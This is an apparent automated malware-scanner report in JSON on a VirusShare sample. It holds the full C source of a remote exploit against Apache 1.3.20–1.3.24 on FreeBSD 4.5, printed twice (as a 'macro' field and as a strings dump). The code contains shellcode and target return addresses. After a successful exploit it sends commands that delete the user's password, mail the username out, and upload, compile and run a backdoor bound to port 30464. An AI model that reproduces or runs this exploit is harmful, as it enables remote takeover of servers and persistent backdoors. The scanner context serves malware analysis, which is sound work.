{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "register": "May call a DLL using Excel 4 Macros",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "/**************************************************************************\n\nFreebsd apache exploit inspirated to me by apache-worm.c\npublished on http://packetstormsecurity.nl.Here is how it\nworks:\n1)Get blackhole.c from packetstorm and set it on port 30464.\n Just change it's default port from the source.\n2) Copy it in /tmp/.blackhole.c\n\n cp blackhole.c /tmp/.blackhole.c\n\n3) Check this source,compile it and run it ./apache-ex <Ip>\nIf everything works fine you will be connected to a shell on 30464,\nthen use another exploit to get root.\n\nIf you have any flames and comment send them to me at <nebunu@home.ro>\nAlso check the worm source too.\n\n**************************************************************************/\n\n\n#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <stdarg.h>\n#include <sys/ioctl.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n#include <unistd.h>\n#include <errno.h>\n#include <netdb.h>\n#include <arpa/telnet.h>\n#include <rpc/rpc.h>\n#include <sys/wait.h>\n#include <signal.h>\n\nint pizda;\n#define ASUCCESS         0\n#define HOST_PARAM\t\"Unknown\"\n#define RET_ADDR_INC\t512\n#define PADSIZE_1\t4\n#define PADSIZE_2 \t5\n#define PADSIZE_3\t7\n#define REP_POPULATOR\t24\n#define REP_SHELLCODE\t24\n#define NOPCOUNT\t1024\n#undef NOP\n#define NOP\t\t0x41\n#define PADDING_1\t'A'\n#define PADDING_2\t'B'\n#define PADDING_3\t'C'\n#define PUT_STRING(s)\tmemcpy(p, s, strlen(s)); p += strlen(s);\n#define PUT_BYTES(n, b)\tmemset(p, b, n); p += n;\nchar shellcode[] =\n  \"\\x68\\x47\\x47\\x47\\x47\\x89\\xe3\\x31\\xc0\\x50\\x50\\x50\\x50\\xc6\\x04\\x24\"\n  \"\\x04\\x53\\x50\\x50\\x31\\xd2\\x31\\xc9\\xb1\\x80\\xc1\\xe1\\x18\\xd1\\xea\\x31\"\n  \"\\xc0\\xb0\\x85\\xcd\\x80\\x72\\x02\\x09\\xca\\xff\\x44\\x24\\x04\\x80\\x7c\\x24\"\n  \"\\x04\\x20\\x75\\xe9\\x31\\xc0\\x89\\x44\\x24\\x04\\xc6\\x44\\x24\\x04\\x20\\x89\"\n  \"\\x64\\x24\\x08\\x89\\x44\\x24\\x0c\\x89\\x44\\x24\\x10\\x89\\x44\\x24\\x14\\x89\"\n  \"\\x54\\x24\\x18\\x8b\\x54\\x24\\x18\\x89\\x14\\x24\\x31\\xc0\\xb0\\x5d\\xcd\\x80\"\n  \"\\x31\\xc9\\xd1\\x2c\\x24\\x73\\x27\\x31\\xc0\\x50\\x50\\x50\\x50\\xff\\x04\\x24\"\n  \"\\x54\\xff\\x04\\x24\\xff\\x04\\x24\\xff\\x04\\x24\\xff\\x04\\x24\\x51\\x50\\xb0\"\n  \"\\x1d\\xcd\\x80\\x58\\x58\\x58\\x58\\x58\\x3c\\x4f\\x74\\x0b\\x58\\x58\\x41\\x80\"\n  \"\\xf9\\x20\\x75\\xce\\xeb\\xbd\\x90\\x31\\xc0\\x50\\x51\\x50\\x31\\xc0\\xb0\\x5a\"\n  \"\\xcd\\x80\\xff\\x44\\x24\\x08\\x80\\x7c\\x24\\x08\\x03\\x75\\xef\\x31\\xc0\\x50\"\n  \"\\xc6\\x04\\x24\\x0b\\x80\\x34\\x24\\x01\\x68\\x42\\x4c\\x45\\x2a\\x68\\x2a\\x47\"\n  \"\\x4f\\x42\\x89\\xe3\\xb0\\x09\\x50\\x53\\xb0\\x01\\x50\\x50\\xb0\\x04\\xcd\\x80\"\n  \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\"\n  \"\\x53\\x89\\xe1\\x50\\x51\\x53\\x50\\xb0\\x3b\\xcd\\x80\\xcc\";\n;\n\nstruct {\nchar *type;\nint delta;\nu_long retaddr;\nint repretaddr;\nint repzero;\n} targets[] = {\n        { \"FreeBSD 4.5 x86 / Apache/1.3.20 (Unix)\",      -146,  0xbfbfde00,6, 36 },\n        { \"FreeBSD 4.5 x86 / Apache/1.3.22-24 (Unix)\",   -134,  0xbfbfdb00,3, 36 },\n}, victim;\n\n\n\nint conectare(char *ip, int port)\n{\nstruct sockaddr_in addr;\nint pizda;\npizda = socket(AF_INET, SOCK_STREAM, 0);\nif(pizda == -1)\n{\nperror(\"socket()\");\nexit(-1);\n}\naddr.sin_addr.s_addr = inet_addr(ip);\naddr.sin_family = AF_INET;\naddr.sin_port = htons(port);\nif(connect(pizda,(struct sockaddr *)&addr,sizeof(struct sockaddr_in)) == -1)\nreturn -1;\nreturn(pizda);\n}\n\n\n\nvoid pulamea(int pizda)\n{\nint             n;\nchar            recvbuf[1024], *cmd = \"id; uname -a\\n\";\nfd_set          rset;\nsend(pizda, cmd, strlen(cmd), 0);\nwhile (1)\n{\nFD_ZERO(&rset);\nFD_SET(pizda, &rset);\nFD_SET(STDIN_FILENO, &rset);\nselect(pizda+1, &rset, NULL, NULL, NULL);\nif(FD_ISSET(pizda, &rset))\n{\nn = read(pizda, recvbuf, 1024);\nif (n <= 0)\n{\nprintf(\"Connection closed by foreign host!\\n\");\nexit(0);\n}\nrecvbuf[n] = 0;\nprintf(\"%s\", recvbuf);\n}\nif (FD_ISSET(STDIN_FILENO, &rset))\n{\nn = read(STDIN_FILENO, recvbuf, 1024);\nif (n > 0)\n{\nrecvbuf[n] = 0;\nwrite(pizda, recvbuf, n);\n}\n}\n}\nreturn;\n}\n\n\n\n\n\n\n\nvoid cleanup(char *buf) \n{\nwhile(buf[strlen(buf)-1] == '\\n' || buf[strlen(buf)-1] == '\\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;\nwhile(*buf == '\\n' || *buf == '\\r' || *buf == ' ') {\nunsigned long i;\nfor (i=strlen(buf)+1;i>0;i++) buf[i-1]=buf[i];\n}\n}\n\n\nchar *GetAddress(char *ip) {\nstruct sockaddr_in sin;\nfd_set fds;\nint n,d,sock;\nchar buf[1024];\nstruct timeval tv;\nsock = socket(PF_INET, SOCK_STREAM, 0);\nsin.sin_family = PF_INET;\nsin.sin_addr.s_addr = inet_addr(ip);\nsin.sin_port = htons(80);\nif(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) return NULL;\nwrite(sock,\"GET / HTTP/1.1\\r\\n\\r\\n\",strlen(\"GET / HTTP/1.1\\r\\n\\r\\n\"));\ntv.tv_sec = 15;\ntv.tv_usec = 0;\nFD_ZERO(&fds);\nFD_SET(sock, &fds);\nmemset(buf, 0, sizeof(buf));\nif(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {\nif(FD_ISSET(sock, &fds)) \n{\nif((n = read(sock, buf, sizeof(buf) - 1)) < 0) return NULL;\nfor (d=0;d<n;d++) if (!strncmp(buf+d,\"Server: \",strlen(\"Server: \"))) {\nchar *start=buf+d+strlen(\"Server: \");\nfor (d=0;d<strlen(start);d++) if (start[d] == '\\n') start[d]=0;\ncleanup(start);\nreturn strdup(start);\n}\n}\n}\nreturn NULL;\n}\n\n#define\tENC(c) ((c) ? ((c) & 077) + ' ': '`')\n\nint sendch(int sock,int buf) {\nchar a[2];\nint b=1;\nif (buf == '`' || buf == '\\\\' || buf == '$') {\na[0]='\\\\';\na[1]=0;\nb=write(sock,a,1);\n}\nif (b <= 0) return b;\na[0]=buf;\na[1]=0;\nreturn write(sock,a,1);\n}\n\nint writem(int sock, char *str) {\nreturn write(sock,str,strlen(str));\n}\n\nint encode(int a) {\nregister int ch, n;\nregister char *p;\nchar buf[80];\nFILE *in;\nif ((in=fopen(\"/tmp/.blackhole.c\",\"r\")) == NULL) return 0;\nwritem(a,\"begin 655 .blackhole.c\\n\");\nwhile ((n = fread(buf, 1, 45, in))) {\nch = ENC(n);\nif (sendch(a,ch) <= ASUCCESS) break;\nfor (p = buf; n > 0; n -= 3, p += 3) {\nif (n < 3) \n{\np[2] = '\\0';\nif (n < 2) p[1] = '\\0';\n}\nch = *p >> 2;\nch = ENC(ch);\nif (sendch(a,ch) <= ASUCCESS) break;\nch = ((*p << 4) & 060) | ((p[1] >> 4) & 017);\nch = ENC(ch);\nif (sendch(a,ch) <= ASUCCESS) break;\nch = ((p[1] << 2) & 074) | ((p[2] >> 6) & 03);\nch = ENC(ch);\nif (sendch(a,ch) <= ASUCCESS) break;\nch = p[2] & 077;\nch = ENC(ch);\nif (sendch(a,ch) <= ASUCCESS) break;\n}\nch='\\n';\nif (sendch(a,ch) <= ASUCCESS) break;\nusleep(10);\n}\nif (ferror(in)) {\nfclose(in);\nreturn 0;\n}\nch = ENC('\\0');\nsendch(a,ch);\nch = '\\n';\nsendch(a,ch);\nwritem(a,\"end\\n\");\nif (in) fclose(in);\nreturn 1;\n}\n\nvoid exploit(char *ip) {\nchar *a=GetAddress(ip);\nint l,sock;\nstruct sockaddr_in sin;\nif (a == NULL) exit(0);\nif (strncmp(a,\"Apache\",6)) exit(0);\nfree(a);\nalarm(60);\nfor (l=0;l<2;l++) {\nu_char buf[512], *expbuf=0, *p=0;\nint i=0, j=0, responses=0;\nmemcpy(&victim, &targets[l], sizeof(victim));\nsock = socket(PF_INET, SOCK_STREAM, 0);\nsin.sin_family = PF_INET;\nsin.sin_addr.s_addr = inet_addr(ip);\nsin.sin_port = htons(80);\nif(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) exit(1);\np = expbuf = malloc(8192 + ((PADSIZE_3 + NOPCOUNT + 1024) * REP_SHELLCODE) + ((PADSIZE_1 + (victim.repretaddr * 4) + victim.repzero + 1024) * REP_POPULATOR));\nPUT_STRING(\"POST / HTTP/1.1\\r\\nHost: \" HOST_PARAM \"\\r\\n\");\nfor (i = 0; i < REP_SHELLCODE; i++) {\nPUT_STRING(\"X-\");\nPUT_BYTES(PADSIZE_3, PADDING_3);\nPUT_STRING(\": \");\nPUT_BYTES(NOPCOUNT, NOP);\nmemcpy(p, shellcode, sizeof(shellcode) - 1);\np += sizeof(shellcode) - 1;\nPUT_STRING(\"\\r\\n\");\n}\nfor (i = 0; i < REP_POPULATOR; i++) {\nPUT_STRING(\"X-\");\nPUT_BYTES(PADSIZE_1, PADDING_1);\nPUT_STRING(\": \");\nfor (j = 0; j < victim.repretaddr; j++) {\n*p++ = victim.retaddr & 0xff;\n*p++ = (victim.retaddr >> 8) & 0xff;\n*p++ = (victim.retaddr >> 16) & 0xff;\n*p++ = (victim.retaddr >> 24) & 0xff;\n}\nPUT_BYTES(victim.repzero, 0);\nPUT_STRING(\"\\r\\n\");\n}\nPUT_STRING(\"Transfer-Encoding: chunked\\r\\n\");\nsnprintf(buf, sizeof(buf) - 1, \"\\r\\n%x\\r\\n\", PADSIZE_2);\nPUT_STRING(buf);\nPUT_BYTES(PADSIZE_2, PADDING_2);\nsnprintf(buf, sizeof(buf) - 1, \"\\r\\n%x\\r\\n\", victim.delta);\nPUT_STRING(buf);\nwrite(sock, expbuf, p - expbuf);\nresponses = 0;\nwhile (1) {\nfd_set fds;\nint n;\nstruct timeval  tv;\ntv.tv_sec = 15;\ntv.tv_usec = 0;\nFD_ZERO(&fds);\nFD_SET(sock, &fds);\nmemset(buf, 0, sizeof(buf));\nif(select(sock + 1, &fds, NULL, NULL, &tv) > 0) if(FD_ISSET(sock, &fds)) {\nif((n = read(sock, buf, sizeof(buf) - 1)) < 0) break;\nif(n >= 1) \n{\nfor(i = 0; i < n; i ++) if(buf[i] == 'G') responses ++; else responses = 0;\nif(responses >= 2) {\nwrite(sock,\"O\",1);\nalarm(3600);\nsleep(10);\nwritem(sock,\"\\npasswd -d `whoami`;echo `whoami` | mail email@youraddress.com\\n\");\nwritem(sock,\"\\nrm -rf /tmp/.blackhole.c;cat > /tmp/.uublackhole << __eof__;\\n\");\nencode(sock);\nwritem(sock,\"__eof__\\n\");\nsprintf(buf,\"/usr/bin/uudecode -o /tmp/.blackhole.c /tmp/.uublackhole;gcc -o /tmp/.blackhole /tmp/.blackhole.c;chmod +x /tmp/.blackhole;/tmp/.blackhole;exit;\\n\");\nwritem(sock,buf);\nwhile(read(sock,buf,1024)>=0);\nexit(0);\n}\n}\n}\n}\nfree(expbuf);\nclose(sock);\n}\nreturn;\n}\n\n\nmain(int argc,char **argv[])\n\n{\nif (argc!=2)\n{\nprintf(\"AVAILABLE TARGETS:\\n\n1)   FreeBSD 4.5 x86 / Apache/1.3.20 (Unix)      \n2)   FreeBSD 4.5 x86 / Apache/1.3.22-24 (Unix)\n\n\n  Adapted after a apache worm by\n  nebunu <nebunu@home.ro>\n  \n  Usage: ./apache-ex <IP>\n\\n\\n\");\nexit(0);\n}\nprintf(\"Exploiting %s , nebunu rulez!\\n..\",argv[1]);\nexploit(argv[1]);\nsleep(3);\nprintf(\"Connecting to shell on port 30464\\n...\");\npizda=conectare(argv[1],30464);\npulamea(pizda);\n}"
    },
    "filename": "VirusShare_c951622daa65e39d1df562c2219acecc",
    "filesize": 9102,
    "filetype": "C source, ASCII text",
    "hashes": {
        "md5": "c951622daa65e39d1df562c2219acecc",
        "sha1": "8faf2aee3ab11e8ea7a8cbf51f4bfb14f44d2e26",
        "sha256": "f406bf2bf696f6639b1cc39d57ebe81efe602557b5527375dfa26c0efe708046"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "/**************************************************************************",
            "Freebsd apache exploit inspirated to me by apache-worm.c",
            "published on http://packetstormsecurity.nl.Here is how it",
            "works:",
            "1)Get blackhole.c from packetstorm and set it on port 30464.",
            " Just change it's default port from the source.",
            "2) Copy it in /tmp/.blackhole.c",
            " cp blackhole.c /tmp/.blackhole.c",
            "3) Check this source,compile it and run it ./apache-ex <Ip>",
            "If everything works fine you will be connected to a shell on 30464,",
            "then use another exploit to get root.",
            "If you have any flames and comment send them to me at <nebunu@home.ro>",
            "Also check the worm source too.",
            "**************************************************************************/",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <fcntl.h>",
            "#include <stdlib.h>",
            "#include <stdarg.h>",
            "#include <sys/ioctl.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <sys/time.h>",
            "#include <unistd.h>",
            "#include <errno.h>",
            "#include <netdb.h>",
            "#include <arpa/telnet.h>",
            "#include <rpc/rpc.h>",
            "#include <sys/wait.h>",
            "#include <signal.h>",
            "int pizda;",
            "#define ASUCCESS         0",
            "#define HOST_PARAM\t\"Unknown\"",
            "#define RET_ADDR_INC\t512",
            "#define PADSIZE_1\t4",
            "#define PADSIZE_2 \t5",
            "#define PADSIZE_3\t7",
            "#define REP_POPULATOR\t24",
            "#define REP_SHELLCODE\t24",
            "#define NOPCOUNT\t1024",
            "#undef NOP",
            "#define NOP\t\t0x41",
            "#define PADDING_1\t'A'",
            "#define PADDING_2\t'B'",
            "#define PADDING_3\t'C'",
            "#define PUT_STRING(s)\tmemcpy(p, s, strlen(s)); p += strlen(s);",
            "#define PUT_BYTES(n, b)\tmemset(p, b, n); p += n;",
            "char shellcode[] =",
            "  \"\\x68\\x47\\x47\\x47\\x47\\x89\\xe3\\x31\\xc0\\x50\\x50\\x50\\x50\\xc6\\x04\\x24\"",
            "  \"\\x04\\x53\\x50\\x50\\x31\\xd2\\x31\\xc9\\xb1\\x80\\xc1\\xe1\\x18\\xd1\\xea\\x31\"",
            "  \"\\xc0\\xb0\\x85\\xcd\\x80\\x72\\x02\\x09\\xca\\xff\\x44\\x24\\x04\\x80\\x7c\\x24\"",
            "  \"\\x04\\x20\\x75\\xe9\\x31\\xc0\\x89\\x44\\x24\\x04\\xc6\\x44\\x24\\x04\\x20\\x89\"",
            "  \"\\x64\\x24\\x08\\x89\\x44\\x24\\x0c\\x89\\x44\\x24\\x10\\x89\\x44\\x24\\x14\\x89\"",
            "  \"\\x54\\x24\\x18\\x8b\\x54\\x24\\x18\\x89\\x14\\x24\\x31\\xc0\\xb0\\x5d\\xcd\\x80\"",
            "  \"\\x31\\xc9\\xd1\\x2c\\x24\\x73\\x27\\x31\\xc0\\x50\\x50\\x50\\x50\\xff\\x04\\x24\"",
            "  \"\\x54\\xff\\x04\\x24\\xff\\x04\\x24\\xff\\x04\\x24\\xff\\x04\\x24\\x51\\x50\\xb0\"",
            "  \"\\x1d\\xcd\\x80\\x58\\x58\\x58\\x58\\x58\\x3c\\x4f\\x74\\x0b\\x58\\x58\\x41\\x80\"",
            "  \"\\xf9\\x20\\x75\\xce\\xeb\\xbd\\x90\\x31\\xc0\\x50\\x51\\x50\\x31\\xc0\\xb0\\x5a\"",
            "  \"\\xcd\\x80\\xff\\x44\\x24\\x08\\x80\\x7c\\x24\\x08\\x03\\x75\\xef\\x31\\xc0\\x50\"",
            "  \"\\xc6\\x04\\x24\\x0b\\x80\\x34\\x24\\x01\\x68\\x42\\x4c\\x45\\x2a\\x68\\x2a\\x47\"",
            "  \"\\x4f\\x42\\x89\\xe3\\xb0\\x09\\x50\\x53\\xb0\\x01\\x50\\x50\\xb0\\x04\\xcd\\x80\"",
            "  \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\"",
            "  \"\\x53\\x89\\xe1\\x50\\x51\\x53\\x50\\xb0\\x3b\\xcd\\x80\\xcc\";",
            "struct {",
            "char *type;",
            "int delta;",
            "u_long retaddr;",
            "int repretaddr;",
            "int repzero;",
            "} targets[] = {",
            "        { \"FreeBSD 4.5 x86 / Apache/1.3.20 (Unix)\",      -146,  0xbfbfde00,6, 36 },",
            "        { \"FreeBSD 4.5 x86 / Apache/1.3.22-24 (Unix)\",   -134,  0xbfbfdb00,3, 36 },",
            "}, victim;",
            "int conectare(char *ip, int port)",
            "struct sockaddr_in addr;",
            "int pizda;",
            "pizda = socket(AF_INET, SOCK_STREAM, 0);",
            "if(pizda == -1)",
            "perror(\"socket()\");",
            "exit(-1);",
            "addr.sin_addr.s_addr = inet_addr(ip);",
            "addr.sin_family = AF_INET;",
            "addr.sin_port = htons(port);",
            "if(connect(pizda,(struct sockaddr *)&addr,sizeof(struct sockaddr_in)) == -1)",
            "return -1;",
            "return(pizda);",
            "void pulamea(int pizda)",
            "int             n;",
            "char            recvbuf[1024], *cmd = \"id; uname -a\\n\";",
            "fd_set          rset;",
            "send(pizda, cmd, strlen(cmd), 0);",
            "while (1)",
            "FD_ZERO(&rset);",
            "FD_SET(pizda, &rset);",
            "FD_SET(STDIN_FILENO, &rset);",
            "select(pizda+1, &rset, NULL, NULL, NULL);",
            "if(FD_ISSET(pizda, &rset))",
            "n = read(pizda, recvbuf, 1024);",
            "if (n <= 0)",
            "printf(\"Connection closed by foreign host!\\n\");",
            "exit(0);",
            "recvbuf[n] = 0;",
            "printf(\"%s\", recvbuf);",
            "if (FD_ISSET(STDIN_FILENO, &rset))",
            "n = read(STDIN_FILENO, recvbuf, 1024);",
            "if (n > 0)",
            "recvbuf[n] = 0;",
            "write(pizda, recvbuf, n);",
            "return;",
            "void cleanup(char *buf) ",
            "while(buf[strlen(buf)-1] == '\\n' || buf[strlen(buf)-1] == '\\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;",
            "while(*buf == '\\n' || *buf == '\\r' || *buf == ' ') {",
            "unsigned long i;",
            "for (i=strlen(buf)+1;i>0;i++) buf[i-1]=buf[i];",
            "char *GetAddress(char *ip) {",
            "struct sockaddr_in sin;",
            "fd_set fds;",
            "int n,d,sock;",
            "char buf[1024];",
            "struct timeval tv;",
            "sock = socket(PF_INET, SOCK_STREAM, 0);",
            "sin.sin_family = PF_INET;",
            "sin.sin_addr.s_addr = inet_addr(ip);",
            "sin.sin_port = htons(80);",
            "if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) return NULL;",
            "write(sock,\"GET / HTTP/1.1\\r\\n\\r\\n\",strlen(\"GET / HTTP/1.1\\r\\n\\r\\n\"));",
            "tv.tv_sec = 15;",
            "tv.tv_usec = 0;",
            "FD_ZERO(&fds);",
            "FD_SET(sock, &fds);",
            "memset(buf, 0, sizeof(buf));",
            "if(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {",
            "if(FD_ISSET(sock, &fds)) ",
            "if((n = read(sock, buf, sizeof(buf) - 1)) < 0) return NULL;",
            "for (d=0;d<n;d++) if (!strncmp(buf+d,\"Server: \",strlen(\"Server: \"))) {",
            "char *start=buf+d+strlen(\"Server: \");",
            "for (d=0;d<strlen(start);d++) if (start[d] == '\\n') start[d]=0;",
            "cleanup(start);",
            "return strdup(start);",
            "return NULL;",
            "#define\tENC(c) ((c) ? ((c) & 077) + ' ': '`')",
            "int sendch(int sock,int buf) {",
            "char a[2];",
            "int b=1;",
            "if (buf == '`' || buf == '\\\\' || buf == '$') {",
            "a[0]='\\\\';",
            "a[1]=0;",
            "b=write(sock,a,1);",
            "if (b <= 0) return b;",
            "a[0]=buf;",
            "a[1]=0;",
            "return write(sock,a,1);",
            "int writem(int sock, char *str) {",
            "return write(sock,str,strlen(str));",
            "int encode(int a) {",
            "register int ch, n;",
            "register char *p;",
            "char buf[80];",
            "FILE *in;",
            "if ((in=fopen(\"/tmp/.blackhole.c\",\"r\")) == NULL) return 0;",
            "writem(a,\"begin 655 .blackhole.c\\n\");",
            "while ((n = fread(buf, 1, 45, in))) {",
            "ch = ENC(n);",
            "if (sendch(a,ch) <= ASUCCESS) break;",
            "for (p = buf; n > 0; n -= 3, p += 3) {",
            "if (n < 3) ",
            "p[2] = '\\0';",
            "if (n < 2) p[1] = '\\0';",
            "ch = *p >> 2;",
            "ch = ENC(ch);",
            "if (sendch(a,ch) <= ASUCCESS) break;",
            "ch = ((*p << 4) & 060) | ((p[1] >> 4) & 017);",
            "ch = ENC(ch);",
            "if (sendch(a,ch) <= ASUCCESS) break;",
            "ch = ((p[1] << 2) & 074) | ((p[2] >> 6) & 03);",
            "ch = ENC(ch);",
            "if (sendch(a,ch) <= ASUCCESS) break;",
            "ch = p[2] & 077;",
            "ch = ENC(ch);",
            "if (sendch(a,ch) <= ASUCCESS) break;",
            "ch='\\n';",
            "if (sendch(a,ch) <= ASUCCESS) break;",
            "usleep(10);",
            "if (ferror(in)) {",
            "fclose(in);",
            "return 0;",
            "ch = ENC('\\0');",
            "sendch(a,ch);",
            "ch = '\\n';",
            "sendch(a,ch);",
            "writem(a,\"end\\n\");",
            "if (in) fclose(in);",
            "return 1;",
            "void exploit(char *ip) {",
            "char *a=GetAddress(ip);",
            "int l,sock;",
            "struct sockaddr_in sin;",
            "if (a == NULL) exit(0);",
            "if (strncmp(a,\"Apache\",6)) exit(0);",
            "free(a);",
            "alarm(60);",
            "for (l=0;l<2;l++) {",
            "u_char buf[512], *expbuf=0, *p=0;",
            "int i=0, j=0, responses=0;",
            "memcpy(&victim, &targets[l], sizeof(victim));",
            "sock = socket(PF_INET, SOCK_STREAM, 0);",
            "sin.sin_family = PF_INET;",
            "sin.sin_addr.s_addr = inet_addr(ip);",
            "sin.sin_port = htons(80);",
            "if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) exit(1);",
            "p = expbuf = malloc(8192 + ((PADSIZE_3 + NOPCOUNT + 1024) * REP_SHELLCODE) + ((PADSIZE_1 + (victim.repretaddr * 4) + victim.repzero + 1024) * REP_POPULATOR));",
            "PUT_STRING(\"POST / HTTP/1.1\\r\\nHost: \" HOST_PARAM \"\\r\\n\");",
            "for (i = 0; i < REP_SHELLCODE; i++) {",
            "PUT_STRING(\"X-\");",
            "PUT_BYTES(PADSIZE_3, PADDING_3);",
            "PUT_STRING(\": \");",
            "PUT_BYTES(NOPCOUNT, NOP);",
            "memcpy(p, shellcode, sizeof(shellcode) - 1);",
            "p += sizeof(shellcode) - 1;",
            "PUT_STRING(\"\\r\\n\");",
            "for (i = 0; i < REP_POPULATOR; i++) {",
            "PUT_STRING(\"X-\");",
            "PUT_BYTES(PADSIZE_1, PADDING_1);",
            "PUT_STRING(\": \");",
            "for (j = 0; j < victim.repretaddr; j++) {",
            "*p++ = victim.retaddr & 0xff;",
            "*p++ = (victim.retaddr >> 8) & 0xff;",
            "*p++ = (victim.retaddr >> 16) & 0xff;",
            "*p++ = (victim.retaddr >> 24) & 0xff;",
            "PUT_BYTES(victim.repzero, 0);",
            "PUT_STRING(\"\\r\\n\");",
            "PUT_STRING(\"Transfer-Encoding: chunked\\r\\n\");",
            "snprintf(buf, sizeof(buf) - 1, \"\\r\\n%x\\r\\n\", PADSIZE_2);",
            "PUT_STRING(buf);",
            "PUT_BYTES(PADSIZE_2, PADDING_2);",
            "snprintf(buf, sizeof(buf) - 1, \"\\r\\n%x\\r\\n\", victim.delta);",
            "PUT_STRING(buf);",
            "write(sock, expbuf, p - expbuf);",
            "responses = 0;",
            "while (1) {",
            "fd_set fds;",
            "int n;",
            "struct timeval  tv;",
            "tv.tv_sec = 15;",
            "tv.tv_usec = 0;",
            "FD_ZERO(&fds);",
            "FD_SET(sock, &fds);",
            "memset(buf, 0, sizeof(buf));",
            "if(select(sock + 1, &fds, NULL, NULL, &tv) > 0) if(FD_ISSET(sock, &fds)) {",
            "if((n = read(sock, buf, sizeof(buf) - 1)) < 0) break;",
            "if(n >= 1) ",
            "for(i = 0; i < n; i ++) if(buf[i] == 'G') responses ++; else responses = 0;",
            "if(responses >= 2) {",
            "write(sock,\"O\",1);",
            "alarm(3600);",
            "sleep(10);",
            "writem(sock,\"\\npasswd -d `whoami`;echo `whoami` | mail email@youraddress.com\\n\");",
            "writem(sock,\"\\nrm -rf /tmp/.blackhole.c;cat > /tmp/.uublackhole << __eof__;\\n\");",
            "encode(sock);",
            "writem(sock,\"__eof__\\n\");",
            "sprintf(buf,\"/usr/bin/uudecode -o /tmp/.blackhole.c /tmp/.uublackhole;gcc -o /tmp/.blackhole /tmp/.blackhole.c;chmod +x /tmp/.blackhole;/tmp/.blackhole;exit;\\n\");",
            "writem(sock,buf);",
            "while(read(sock,buf,1024)>=0);",
            "exit(0);",
            "free(expbuf);",
            "close(sock);",
            "return;",
            "main(int argc,char **argv[])",
            "if (argc!=2)",
            "printf(\"AVAILABLE TARGETS:\\n",
            "1)   FreeBSD 4.5 x86 / Apache/1.3.20 (Unix)      ",
            "2)   FreeBSD 4.5 x86 / Apache/1.3.22-24 (Unix)",
            "  Adapted after a apache worm by",
            "  nebunu <nebunu@home.ro>",
            "  Usage: ./apache-ex <IP>",
            "\\n\\n\");",
            "exit(0);",
            "printf(\"Exploiting %s , nebunu rulez!\\n..\",argv[1]);",
            "exploit(argv[1]);",
            "sleep(3);",
            "printf(\"Connecting to shell on port 30464\\n...\");",
            "pizda=conectare(argv[1],30464);",
            "pulamea(pizda);"
        ],
        "file": {},
        "fuzzing": {
            "Possible encoded string": [
                "  \"\\xf9\\x20\\x75\\xce\\xeb\\xbd\\x90\\x31\\xc0\\x50\\x51\\x50\\x31\\xc0\\xb0\\x5a\""
            ]
        },
        "ip": [],
        "url": [
            "http://packetstormsecurity.nl.Here"
        ]
    },
    "time": "0:00:00.317562",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
